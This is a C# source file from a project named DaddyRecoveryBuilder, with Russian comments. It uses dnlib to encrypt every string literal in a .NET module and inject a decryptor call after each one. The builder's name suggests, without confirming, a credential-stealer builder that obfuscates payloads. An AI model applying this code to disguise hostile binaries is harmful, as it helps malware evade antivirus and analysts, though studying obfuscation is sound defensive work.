namespace DaddyRecoveryBuilder.Editors
{
    using System.Linq;
    using dnlib.DotNet;
    using dnlib.DotNet.Emit;
    using Injectors;

    public static class StringsEditor
    {
        /// <summary>
        /// <br>Метод для шифрования всех инструкций <b>Ldstr(string)</b></br>
        /// <br>С добавлением метода расшифровки <b>(Decryptor)</b></br>
        /// </summary>
        /// <param name="inModule">Имя модуля для шифрования</param>
        /// <returns>Закодированные инструкции <b>Ldstr</b></returns>
        public static ModuleDef EncryptStrings(ModuleDef inModule)
        {
            ModuleDef module = inModule;
            // Инжектим метод расшифровки текста
            MethodDef decryptMethod = InjectClass.InjectMethod(module, typeof(DecTools), "DecompressString");
            foreach (MethodDef method in module.Types.Where(type => !type.IsGlobalModuleType && type.Name != "Resources" && type.Name != "Settings").SelectMany(type => type.Methods).Where(method => method.HasBody && method != decryptMethod))
            {
                method.Body.KeepOldMaxStack = true;// Не допускать переполнения стека
                for (int i = 0; i < method.Body.Instructions.Count; i++)
                {
                    // Получаем все инструкции типа string
                    if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                    {
                        // Оригинальная строка (не зашифрованная)
                        string oldString = method.Body.Instructions[i].Operand?.ToString();
                        // Шифруем строки
                        method.Body.Instructions[i].Operand = EncTools.CompressString(oldString);
                        // Добавляем вызов метода для расшифровки текста
                        method.Body.Instructions.Insert(i + 1, new Instruction(OpCodes.Call, decryptMethod));
                    }
                }
                // Оптимизируем инструкции
                method.Body.SimplifyBranches();
                method.Body.OptimizeBranches();
            }
            return module;
        }
    }
}